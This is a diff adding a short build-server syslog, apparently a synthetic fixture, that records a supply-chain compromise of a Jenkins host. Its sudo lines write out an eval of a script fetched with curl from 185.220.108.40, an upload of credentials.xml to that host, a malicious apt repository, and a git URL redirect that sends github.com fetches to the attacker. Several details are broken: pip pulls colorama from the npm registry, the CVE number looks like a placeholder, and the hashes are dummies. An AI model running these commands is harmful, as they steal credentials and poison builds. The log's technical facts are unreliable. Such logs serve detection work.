@@ -1,0 +1,20 @@
+Jul 28 15:00:00 build-server npm[12010]: WARN deprecated core-js@2.6.12: core-js@<3.23.3 is no longer maintained and contains known vulnerabilities
+Jul 28 15:00:05 build-server npm[12011]: audit detected 15 vulnerabilities (5 critical, 3 high, 7 moderate) in package-lock.json
+Jul 28 15:00:15 build-server npm[12012]: added 1200 packages from 1500 contributors and installed 4500 dependencies in 30s
+Jul 28 15:01:00 build-server pip[12020]: WARNING: package 'pytorch-lightning' (1.4.0) has a known backdoor CVE-2024-12345
+Jul 28 15:01:05 build-server pip[12021]: Installing packages: torch==2.0.1, tensorflow==2.12.0, numpy==1.24.3
+Jul 28 15:01:15 build-server pip[12022]: Downloading package 'colorama' from https://registry.npmjs.org/colorama/-/colorama-0.4.6.tgz
+Jul 28 15:01:30 build-server auditd[12030]: SYSCALL arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffe0b0b0b00 a2=0 a3=0 items=1 ppid=12022 pid=12031 auid=1008 uid=1008 gid=1008 euid=1008 suid=1008 fsuid=1008 egid=1008 sgid=1008 fsgid=1008 tty=pts0 ses=7 comm="curl" exe="/usr/bin/curl" key="net_download"
+Jul 28 15:02:00 build-server sudo[12035]:   jenkins : TTY=pts/0 ; PWD=/var/lib/jenkins/workspace ; USER=root ; COMMAND=/bin/bash -c 'eval $(curl -s http://185.220.108.40:8000/evil.sh)'
+Jul 28 15:02:15 build-server sudo[12040]:   jenkins : TTY=pts/0 ; PWD=/var/lib/jenkins/workspace ; USER=root ; COMMAND=/usr/bin/cat /var/lib/jenkins/credentials.xml
+Jul 28 15:02:30 build-server sudo[12045]:   jenkins : TTY=pts/0 ; PWD=/var/lib/jenkins/workspace ; USER=root ; COMMAND=/usr/bin/curl -F "file=@/var/lib/jenkins/credentials.xml" http://185.220.108.40:8000/collect
+Jul 28 15:03:00 build-server sudo[12050]:   jenkins : TTY=pts/0 ; PWD=/var/lib/jenkins/workspace ; USER=root ; COMMAND=/usr/bin/gpg --import /tmp/malicious-key.asc
+Jul 28 15:03:15 build-server sudo[12055]:   jenkins : TTY=pts/0 ; PWD=/var/lib/jenkins/workspace ; USER=root ; COMMAND=/bin/bash -c 'echo "deb http://185.220.108.40:8000/apt stable main" > /etc/apt/sources.list.d/evil.list'
+Jul 28 15:03:30 build-server apt[12060]: WARNING: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (gpg key added from 185.220.108.40)
+Jul 28 15:03:45 build-server apt[12065]: Install: libssl-dev amd64 (1.1.1-1, automatic) with modified hashes (expected: a1b2c3d4, got: e5f6a7b8)
+Jul 28 15:04:00 build-server sshd[12070]: Failed password for jenkins from 185.220.108.40 port 57001 ssh2
+Jul 28 15:04:02 build-server sshd[12071]: Failed password for jenkins from 185.220.108.40 port 57002 ssh2
+Jul 28 15:04:04 build-server sshd[12072]: Accepted password for jenkins from 185.220.108.40 port 57003 ssh2
+Jul 28 15:04:05 build-server sshd[12072]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Jul 28 15:04:30 build-server sudo[12075]:   jenkins : TTY=pts/1 ; PWD=/var/lib/jenkins ; USER=root ; COMMAND=/bin/bash -c 'git config --global url."http://185.220.108.40:8000/git/".insteadOf "https://github.com/"'
+Jul 28 15:05:00 build-server sudo[12080]:   jenkins : TTY=pts/1 ; PWD=/var/lib/jenkins ; USER=root ; COMMAND=/bin/bash -c 'docker build -t production-app:latest . && docker push registry.internal:5000/production-app:latest'
